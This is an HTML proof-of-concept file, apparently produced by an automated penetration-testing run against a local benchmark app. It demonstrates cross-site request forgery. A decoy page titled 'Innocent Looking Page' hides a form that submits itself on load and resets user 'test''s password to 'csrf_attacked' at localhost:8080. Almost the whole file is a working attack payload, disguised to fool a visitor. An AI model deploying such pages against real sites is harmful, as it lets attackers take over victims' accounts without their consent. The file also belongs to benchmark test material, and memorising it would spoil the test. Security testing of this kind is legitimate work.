<!-- 
POC: CSRF attack POC that demonstrates cross-site password reset. When an authenticated user visits this page, it silently submits a password reset form targeting user 'test', resetting their password to 'csrf_attacked' without user consent.
Target: ./repo
Created: 2025-11-04T14:51:34.914Z
Session: benchmark-XBEN-027-24-mhknopkv

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-027-24-mhknopkv/pocs/poc_csrf_password_reset.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Page</title>
</head>
<body>
    <h1>Loading your content...</h1>
    <p>Please wait while we load your page.</p>
    
    <!-- Hidden CSRF payload -->
    <!-- This form silently submits a password reset request when the page loads -->
    <form id="csrf-form" method="POST" action="http://localhost:8080/password/test" style="display:none;">
        <input type="hidden" name="username" value="test">
        <input type="hidden" name="user_id" value="10031">
        <input type="hidden" name="password" value="csrf_attacked">
    </form>
    
    <script>
        // Auto-submit the form when page loads
        // If the user is authenticated, their browser will send their session cookie
        // with this cross-origin request, performing the password reset
        document.addEventListener('DOMContentLoaded', function() {
            console.log('CSRF Attack: Submitting password reset form...');
            document.getElementById('csrf-form').submit();
        });
    </script>
</body>
</html>